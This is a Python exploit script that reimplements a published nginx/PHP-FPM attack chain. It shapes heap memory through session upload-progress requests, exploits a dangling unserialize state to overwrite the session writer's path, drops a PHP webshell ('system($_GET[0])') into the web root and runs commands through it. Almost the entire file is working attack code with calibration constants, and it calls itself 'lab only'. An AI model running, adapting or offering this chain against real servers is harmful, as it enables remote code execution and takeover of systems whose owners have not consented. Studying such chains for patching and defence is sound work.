#!/usr/bin/env python3
"""php2shell FPM chain - nginx + PHP-FPM, arbitrary file write -> RCE.

Reimplementation (from the static review in docs/research/fpm-128m.md) of the chain published in
kengwang/php2shell-exp.  No upstream code is imported or executed.

Primitive
---------
PHP-FPM parses the request body in sapi_activate(), before module RINIT, so
`php_session_initialize()` -> `php_session_decode()` runs before
`PHP_RINIT(basic_functions)` clears `BG(unserialize)`.  A decode that OOMs
mid-unserialize leaves a per-process dangling `BG(unserialize)` whose entry /
dtor blocks have been returned to the allocator.  The next request's BIG field
re-occupies those blocks, so the decoder walks attacker bytes.  `var_push()`
does `data[used_slots++] = rval`, i.e. used_slots selects an 8-byte write at a
chunk-relative offset: no ASLR leak is needed, both sides are chunk-relative.

Stages: R1 records the payload as an upload_progress key; build_A overflows
var_entries so the stale blocks are separate allocations; prime posts to a page
that calls session_start() and OOMs inside decode; R2a/R2b/R3 aim the next
decode at the progress zval and then at the session writer, whose target path is
replaced with the webshell path.

Requirements: page really calls session_start(), docroot writable by www-data,
session.upload_progress.enabled+cleanup=On, files save handler, nginx/FPM
(php-fpm `pm = static` and --workers == live children for multi-worker).

Lab only.  Constants default to the published 8.4.4-dev calibration and will
need re-measuring for another build (see --e-off/--dt-off/... overrides).
"""
from __future__ import annotations

import argparse
import os
import struct
import sys
import time
import urllib.parse
from http.client import HTTPConnection, HTTPSConnection

BND = b"BNDRY12345"
PAGE = 4096


class Fpm:
    def __init__(self, url: str, timeout: float = 120.0):
        self.url = url.rstrip("/")
        scheme, rest = self.url.split("://", 1)
        self.https = scheme == "https"
        host, _, port = rest.partition(":")
        self.host = host
        self.port = int((port or ("443" if self.https else "80")).split("/")[0])
        self.timeout = timeout

    def req(self, method: str, path: str, body: bytes | None = None,
            ctype: str | None = None, cookie: str | None = None,
            timeout: float | None = None, tries: int = 40):
        last = None
        for _ in range(tries):
            try:
                cls = HTTPSConnection if self.https else HTTPConnection
                conn = cls(self.host, self.port, timeout=timeout or self.timeout)
                headers = {}
                if ctype:
                    headers["Content-Type"] = ctype
                if cookie:
                    headers["Cookie"] = cookie
                if body is not None:
                    headers["Content-Length"] = str(len(body))
                conn.request(method, path, body=body, headers=headers)
                r = conn.getresponse()
                data = r.read()
                status = r.status
                conn.close()
                return status, data
            except (ConnectionError, OSError) as exc:
                last = exc
                time.sleep(0.05)
        return -1, ("EXC %r" % (last,)).encode()

    def get(self, path: str, timeout: float = 5.0):
        return self.req("GET", path, timeout=timeout, tries=1)

    def post(self, parts, sid: str, path: str):
        out = bytearray()
        for name, val, fn in parts:
            out += b"--" + BND + b"\r\n"
            out += b'Content-Disposition: form-data; name="' + _b(name) + b'"'
            if fn is not None:
                out += b'; filename="' + _b(fn) + b'"'
                out += b"\r\nContent-Type: application/octet-stream"
            out += b"\r\n\r\n" + _b(val) + b"\r\n"
        out += b"--" + BND + b"--\r\n"
        return self.req("POST", path, bytes(out),
                        "multipart/form-data; boundary=" + BND.decode(),
                        "PHPSESSID=" + sid)


def _b(x) -> bytes:
    return x.encode() if isinstance(x, str) else x


class Chain:
    def __init__(self, args):
        self.a = args
        self.t = Fpm(args.url, timeout=args.timeout)
        # calibration (published 8.4.4-dev values; re-measure for our build)
        self.e_off = args.e_off
        self.dt_off = args.dt_off
        self.scalar_push = args.scalar_push
        self.array_push = args.array_push
        self.writer = args.writer
        self.filler = args.filler
        self.fstart = args.fstart
        # Two-field filler (docs/research/fpm-128m.md §2.3): on our build a single BIG field
        # starts above E_OFF, so DT and E are patched through separate fields
        # with their own FSTART.  big_dt_size/big_e_size == 0 keeps the legacy
        # single-field path.
        self.big_dt_size = getattr(args, "big_dt_size", 0) or 0
        self.big_e_size = getattr(args, "big_e_size", 0) or 0
        self.fstart_dt = getattr(args, "fstart_dt", None) or args.fstart
        self.fstart_e = getattr(args, "fstart_e", None) or args.fstart
        # Exact chunk-relative data starts (e.g. 0x69018).  The page-granular
        # FSTART cannot express the +0x18 zend_string data skew, and a 0x18
        # error moves the patch off the stale block.  Byte bases win when set.
        self.base_dt = getattr(args, "base_dt", None)
        self.base_e = getattr(args, "base_e", None)
        # A tiny field placed *before* the BIG ones makes $_POST's first hash
        # allocation happen early (low address).  Without it the hash slot
        # array lands on the stale php_unserialize_data struct and zeroes
        # data->last before the decode (observed at chunk+0x6e000).
        self.lead = getattr(args, "lead", 0) or 0
        # Offset (from DT_OFF) of the zend_string* that the R3 aim write puts
        # into ps_files->basedir.  Upstream assumes +0x20; our 8.4.26 decode
        # passes rval = DT_OFF+0x10, so the fake string must start there:
        # len at +0x10 and val at +0x18 from that base.
        self.r3_str_off = getattr(args, "r3_str_off", 0x10)
        # R3 must zero nothing at dtor+0: the dtor stack pushes start at
        # DT_OFF+0x10 and would overwrite the fake zend_string (len at +0x20,
        # path at +0x28).  Start them past the fake string instead.
        self.r3_dt_used = getattr(args, "r3_dt_used", 0)
        # R2a/R2b flush their own progress records into the victim session and
        # change what R3 decodes; a standalone R3 after a fresh prime is
        # deterministic.  --stages r3 selects that shorter chain.
        self.stages = [s.strip() for s in
                       (getattr(args, "stages", "") or "r2a,r2b,r3").split(",")
                       if s.strip()]
        # Deterministic R3 (docs/research/fpm-128m.md): ps_files->basedir is overwritten with the
        # rval of the N-th var_push, and every var_push for a session *record
        # root* writes a var_tmp_var() zval (chunk+dt_off+0x10+16*i).  Nested
        # values write hash-table zvals instead, so the only way to put a
        # controlled pointer into basedir is to make the last two pushes be
        # record roots.  A victim session made of N scalar records gives
        # exactly N pushes: aim so that push N-1 hits last_key and push N hits
        # basedir; then dirdepth is never written.  The fake zend_string lives
        # at the N-th root (str_off = 16*N), whose len/val fields sit past the
        # last dtor entry and therefore survive the decode.
        self.r3_scalars = getattr(args, "r3_scalars", 0) or 0
        if self.r3_scalars >= 2:
            self.writer -= 8 * (self.r3_scalars - 2)
            self.r3_str_off = 0x10 * self.r3_scalars
        # R3 may target a session whose file we control (two scalar records)
        # instead of the R1 progress record; the progress key becomes the
        # payload so the written file is valid PHP.
        self.victim_sid = getattr(args, "victim_sid", "") or ""
        self.victim_path = (getattr(args, "victim_path", "")
                            or getattr(args, "index", "/index.php"))
        self.r3_key = (getattr(args, "r3_key", "") or "").encode() or b"K3"
        # Optional per-attempt aim variants "writer:str_off,..." — the number of
        # var_push calls in R3 depends on the session content, so alternate the
        # two parities: basedir gets push1 (writer=ps_files+8, fake at +0x10) or
        # push2 (writer=ps_files+0, fake at +0x20).
        self.r3_variants = []
        for item in (getattr(args, "r3_variants", "") or "").split(","):
            item = item.strip()
            if not item:
                continue
            w, _, off = item.partition(":")
            self.r3_variants.append((int(w, 0), int(off or "0x20", 0)))
        self.two_field = self.big_dt_size > 0 and self.big_e_size > 0
        if self.two_field and self.base_dt is not None:
            # R3 writes len(shell_path)+1 at dt_off+str_off+0x10 and the path
            # at +0x18, so the DT field must extend past that.  A too-small DT
            # raises deep inside build_filler; warn at construction instead.
            # (self.shell_path is assigned later, so use args here.)
            shell_path = getattr(args, "shell_path", "/srv/www/shell.php")
            tail = self.dt_off + self.r3_str_off
            need = (tail + 0x18 + len(shell_path) + 1 - self.base_dt)
            if need > self.big_dt_size:
                print("WARNING: BIG_DT=%d is too small for the R3 path: need "
                      ">= %d bytes from base %#x (dt_off=%#x + str_off %#x "
                      "+ 0x18 + %d)"
                      % (self.big_dt_size, need, self.base_dt, self.dt_off,
                         self.r3_str_off, len(shell_path) + 1), file=sys.stderr)
        self.press = args.press
        self.prime_press = args.prime_press
        self.fields = args.fields
        self.field_len = args.field_len
        self.levels = args.levels
        self.small = args.small
        self.big = args.big
        self.fnlen = args.fnlen
        self.dup = [int(x) for x in args.dup.split(",") if x.strip()]
        self.workers = args.workers
        self.attempts = args.attempts or (1 if args.workers <= 1 else 3)
        self.settle = args.settle
        self.payload = args.payload.encode()
        self.shell_path = args.shell_path
        self.shell_url = args.shell_url
        self.plain = args.plain
        self.index = args.index

    # ---- request shapes -------------------------------------------------
    def press_parts(self, n):
        lvl = "[a]" * self.levels
        return [(("x%d" % k) + lvl, b"", b"") for k in range(n)]

    def wait_target(self, timeout=40.0):
        t0 = time.time()
        while time.time() - t0 < timeout:
            st, _ = self.t.get(self.plain)
            if st == 200:
                return True
            time.sleep(0.2)
        return False

    def record_request(self, sid, key, fname=b""):
        parts = [("PHPSESSID", sid, None),
                 ("PHP_SESSION_UPLOAD_PROGRESS", _b(key), None),
                 ("f", b"Z", fname)]
        parts += self.press_parts(self.press)
        return self.t.post(parts, sid, self.plain)

    def build_a(self, sid):
        for i in range(self.small):
            self.record_request(sid, "r%03d" % i)
            self.wait_target()
        for i in range(self.big):
            self.record_request(sid, "big%03d" % i, b"F" * self.fnlen)
            self.wait_target()

    def prime_request(self, sid):
        parts = [("P%04d" % i, b"R" * self.field_len, None)
                 for i in range(self.fields)]
        parts += self.press_parts(self.prime_press)
        for d in self.dup:
            parts.append(("P%04d" % d, b"D" * 3, None))
        return self.t.post(parts, sid, self.index)

    def build_filler(self, patches, fstart=None, size=None, base=None):
        """Build one field value with chunk-relative patches applied.

        ``base`` is the exact chunk-relative address where the field's data
        starts (``zend_string->val``); when omitted it falls back to
        ``fstart * PAGE`` for the legacy page-granular callers.
        """
        if base is None:
            fstart = self.fstart if fstart is None else fstart
            base = fstart * PAGE
        size = self.filler if size is None else size
        v = bytearray(b"A" * size)
        for off, data in patches:
            o = off - base
            if o < 0 or o + len(data) > size:
                raise SystemExit(
                    "patch outside filler: off=%#x base=%#x size=%#x"
                    % (off, base, size))
            v[o:o + len(data)] = data
        return bytes(v)

    def aim(self, main_off):
        return (main_off - (self.e_off + 16)) // 8

    def decode_request(self, sid, key, patches, press=0, dt_patches=None):
        """One decode request.

        Single-field mode (legacy): one BIG field carries every patch.
        Two-field mode: BIG_DT carries ``dt_patches`` relative to FSTART_DT,
        BIG_E carries ``patches`` relative to FSTART_E.
        """
        parts = []
        if self.lead:
            parts.append(("p2s_lead", b"x", None))
        if self.two_field:
            parts.append(("BIG_DT", self.build_filler(
                dt_patches or [], self.fstart_dt, self.big_dt_size,
                base=self.base_dt), None))
            parts.append(("BIG_E", self.build_filler(
                patches, self.fstart_e, self.big_e_size,
                base=self.base_e), None))
        else:
            parts.append(("BIG", self.build_filler(patches), None))
        parts.append(("PHP_SESSION_UPLOAD_PROGRESS", _b(key), None))
        parts.append(("f", b"Z", b"a.bin"))
        parts += self.press_parts(press)
        return self.t.post(parts, sid, self.plain)

    def disarm(self, rounds=2):
        for _ in range(rounds * self.workers):
            self.t.req("GET", self.plain, timeout=20.0, tries=3)

    # ---- stages ---------------------------------------------------------
    def stage_r2a(self, sid):
        e_patch = [(self.e_off, struct.pack("<q", self.aim(self.scalar_push)))]
        dt_patch = [(self.dt_off, struct.pack("<q", 0))]
        if self.two_field:
            return self.decode_request(sid, self.payload, e_patch,
                                       dt_patches=dt_patch)[0]
        return self.decode_request(sid, self.payload, e_patch + dt_patch)[0]

    def stage_r2b(self, sid):
        e_patch = [(self.e_off, struct.pack("<q", self.aim(self.array_push)))]
        dt_patch = [(self.dt_off, struct.pack("<q", 0)),
                    (self.dt_off + 0x20, b"\x00" * 8),
                    (self.dt_off + 0x28, b"\x00" * 8),
                    (self.dt_off + 0x30, struct.pack("<Q", 8))]
        if self.two_field:
            return self.decode_request(sid, b"K2", e_patch,
                                       press=self.press, dt_patches=dt_patch)[0]
        return self.decode_request(sid, b"K2", e_patch + dt_patch,
                                   press=self.press)[0]

    def stage_r3(self, sid):
        base = self.dt_off + self.r3_str_off
        e_patch = [(self.e_off, struct.pack("<q", self.aim(self.writer)))]
        # Fake zend_string at `base`: len (with the trailing NUL) at +0x10 and
        # val at +0x18.  ps_files_path_create copies len bytes, so the embedded
        # NUL makes open() stop at the shell path.
        dt_patch = [(self.dt_off, struct.pack("<q", self.r3_dt_used)),
                    (base + 0x10, struct.pack("<Q", len(self.shell_path) + 1)),
                    (base + 0x18, self.shell_path.encode() + b"\x00")]
        if self.two_field:
            return self.decode_request(sid, self.r3_key, e_patch,
                                       dt_patches=dt_patch)[0]
        return self.decode_request(sid, self.r3_key, e_patch + dt_patch)[0]

    def run_attempt(self, attempt):
        if self.r3_variants:
            self.writer, self.r3_str_off = self.r3_variants[
                attempt % len(self.r3_variants)]
            print("== R3 variant: writer=%#x str_off=%#x"
                  % (self.writer, self.r3_str_off), flush=True)
        sid_rec = "scal" if attempt == 0 else "scal%d" % attempt
        sids = (["asx"] if self.workers <= 1
                else ["asx%d" % i for i in range(self.workers)])
        if attempt:
            sids = [s + str(attempt) for s in sids]

        # Prepare the deterministic victim session first: one GET to a page
        # that starts a session and stores N scalar values.  This must happen
        # before the prime, because any GET after it consumes the stale
        # unserialize state.
        sid_r3 = sid_rec
        if self.victim_sid:
            sid_r3 = self.victim_sid if attempt == 0 else "%s%d" % (
                self.victim_sid, attempt)
            st, _ = self.t.req("GET", self.victim_path,
                               cookie="PHPSESSID=" + sid_r3,
                               timeout=20.0, tries=3)
            print("== victim session %s -> %s" % (sid_r3, st), flush=True)
            self.wait_target()

        print(f"== R1 (session {sid_rec})", flush=True)
        print("   R1 ->", self.record_request(sid_rec, self.payload)[0], flush=True)
        self.wait_target()
        self.disarm()

        done = 0
        stage_map = {"r2a": self.stage_r2a, "r2b": self.stage_r2b,
                     "r3": self.stage_r3}
        stages = tuple(stage_map[s] for s in self.stages)
        while done < len(stages):
            if done:
                self.wait_target()
                self.disarm()
            print(f"== build A x{len(sids)} + arm", flush=True)
            for sid in sids:
                self.build_a(sid)
            time.sleep(self.settle)
            for sid in sids:
                print("   prime", sid, "->", self.prime_request(sid)[0], flush=True)
            for _ in range(min(3, self.workers)):
                if done >= len(stages):
                    break
                print("   stage", done, "->", stages[done](sid_r3), flush=True)
                done += 1

    def execute(self, cmd):
        st, body = self.t.req("GET", "%s?0=%s" % (self.shell_url,
                                                 urllib.parse.quote(cmd)),
                              timeout=20.0, tries=3)
        i = body.find(b"upload_progress_")
        if i < 0:
            return st, body.decode("latin1", "replace").strip()
        rest = body[i + len("upload_progress_"):]
        j = rest.find(b"|i:0;")
        return st, (rest if j < 0 else rest[:j]).decode("latin1", "replace").strip()

    def run(self):
        print(f"target {self.a.url} payload={self.payload!r} "
              f"shell={self.shell_path} workers={self.workers}", flush=True)
        if not self.wait_target():
            print("target not answering", file=sys.stderr)
            return 1
        st, out = -1, ""
        for attempt in range(self.attempts):
            if attempt:
                print("== retry on fresh session ids", flush=True)
            self.run_attempt(attempt)
            st, out = self.execute(self.a.cmd)
            print(f"== GET {self.shell_url} -> {st}\n{out}", flush=True)
            if st == 200 and out:
                break
        if self.a.proof:
            with open(self.a.proof, "w", encoding="utf-8") as f:
                f.write(out + "\n")
        if st != 200 or not out:
            print("NO PROOF: shell did not answer (re-measure the FPM constants, "
                  "or set --workers to the live child count)", file=sys.stderr)
            return 1
        print("PROOF:", out)
        return 0


def main() -> int:
    ap = argparse.ArgumentParser(description=__doc__,
                                 formatter_class=argparse.RawDescriptionHelpFormatter)
    ap.add_argument("--url", required=True)
    ap.add_argument("--cmd", default="id")
    ap.add_argument("--proof", default="")
    ap.add_argument("--workers", type=int, default=1)
    ap.add_argument("--attempts", type=int, default=0)
    ap.add_argument("--settle", type=float, default=0.5)
    ap.add_argument("--timeout", type=float, default=120.0)
    ap.add_argument("--plain", default="/plain.php")
    ap.add_argument("--index", default="/index.php")
    ap.add_argument("--payload", default="<?php system($_GET[0]); ?>")
    ap.add_argument("--shell-path", default="/srv/www/shell.php")
    ap.add_argument("--shell-url", default="/shell.php")
    # calibration (2026-10-24: measured on a self-compiled php-8.4.26 debug
    # build; see docs/research/fpm-128m.md §3.4.  E_OFF/DT_OFF are *shape-dependent*: the values
    # below are the upstream 8.4.4-dev placeholders, not production constants.
    # For the 15MB / 200-press decode shape we measured last=0x87000 and
    # last_dtor=0x6b000; re-measure for any other build_A/prime shape.)
    ap.add_argument("--e-off", type=lambda x: int(x, 0), default=0x76000)
    ap.add_argument("--dt-off", type=lambda x: int(x, 0), default=0x7C000)
    ap.add_argument("--scalar-push", type=lambda x: int(x, 0), default=0x63058)
    ap.add_argument("--array-push", type=lambda x: int(x, 0), default=0x63050)
    # 8.4.26: ps_files=chunk+0x58230, basedir=+0x08 -> 0x58238.  The published
    # 8.4.4-dev value was 0x58190 (ps_files=0x58188), i.e. +0xA8.
    ap.add_argument("--writer", type=lambda x: int(x, 0), default=0x58238)
    ap.add_argument("--filler", type=int, default=131072)
    ap.add_argument("--fstart", type=int, default=100)
    # Two-field filler (docs/research/fpm-128m.md §2.3).  Sizes and FSTARTs are per-field; the
    # defaults are the plan for the 8.4.26 debug build, but the *actual*
    # combined starts must be measured with gdb (a 16KB field shifts the 96KB
    # one) before trusting them.
    ap.add_argument("--big-dt-size", type=int, default=0,
                    help="size of the BIG_DT field (0 = legacy single field)")
    ap.add_argument("--big-e-size", type=int, default=0,
                    help="size of the BIG_E field (0 = legacy single field)")
    ap.add_argument("--fstart-dt", type=int, default=None,
                    help="page (chunk offset / 4096) where BIG_DT's data starts")
    ap.add_argument("--fstart-e", type=int, default=None,
                    help="page (chunk offset / 4096) where BIG_E's data starts")
    ap.add_argument("--base-dt", type=lambda x: int(x, 0), default=None,
                    help="exact chunk offset of BIG_DT data (e.g. 0x69018); "
                         "overrides --fstart-dt")
    ap.add_argument("--base-e", type=lambda x: int(x, 0), default=None,
                    help="exact chunk offset of BIG_E data (e.g. 0x81018); "
                         "overrides --fstart-e")
    ap.add_argument("--lead", type=int, default=0,
                    help="send N tiny fields before the BIG ones so $_POST's "
                         "hash allocation happens early (avoids clobbering the "
                         "stale unserialize struct)")
    ap.add_argument("--r3-str-off", type=lambda x: int(x, 0), default=0x10,
                    help="offset of the R3 fake zend_string from DT_OFF "
                         "(our 8.4.26 decode writes basedir = DT_OFF+0x10)")
    ap.add_argument("--r3-dt-used", type=lambda x: int(x, 0), default=0,
                    help="value written to the R3 dtor block's used_slots; "
                         "8 keeps dtor pushes past the fake string")
    ap.add_argument("--stages", default="r2a,r2b,r3",
                    help="comma-separated stages to run; 'r3' skips the two "
                         "record-shaping stages (deterministic standalone R3)")
    ap.add_argument("--victim-sid", default="",
                    help="session id for R3; the chain first GETs --victim-path "
                         "with this cookie so the page writes its scalar "
                         "session variables (deterministic 2-push R3, docs/research/fpm-128m.md)")
    ap.add_argument("--victim-path", default="",
                    help="page used to create the victim session (default "
                         "--index); it must start a session and store N scalar "
                         "values in $_SESSION")
    ap.add_argument("--r3-key", default="",
                    help="upload-progress key for R3 (default K3); with "
                         "--victim-sid pass the PHP payload so the written "
                         "session file is executable")
    ap.add_argument("--r3-scalars", type=int, default=0,
                    help="N scalar records in the victim session: shifts the "
                         "aim so pushes N-1/N hit last_key/basedir and puts the "
                         "fake zend_string at dt_off+16*N (N>=2)")
    ap.add_argument("--r3-variants", default="",
                    help="per-attempt aim variants, e.g. "
                         "'0x581e0:0x20,0x581e8:0x10' (writer:str_off)")
    ap.add_argument("--press", type=int, default=920)
    # 8.4.26: 780 + a 15MB session file OOMs in ps_read_files, not in
    # php_var_unserialize (docs/research/fpm-128m.md §3.4); 400 decodes successfully.  The prime
    # shape still needs a dedicated calibration.
    ap.add_argument("--prime-press", type=int, default=780)
    ap.add_argument("--fields", type=int, default=170)
    ap.add_argument("--field-len", type=int, default=4000)
    ap.add_argument("--levels", type=int, default=60)
    ap.add_argument("--small", type=int, default=73)
    ap.add_argument("--big", type=int, default=20)
    ap.add_argument("--fnlen", type=int, default=750000)
    ap.add_argument("--dup", default="0,2,3," + ",".join(str(i) for i in range(6, 100, 2)))
    a = ap.parse_args()
    return Chain(a).run()


if __name__ == "__main__":
    sys.exit(main())
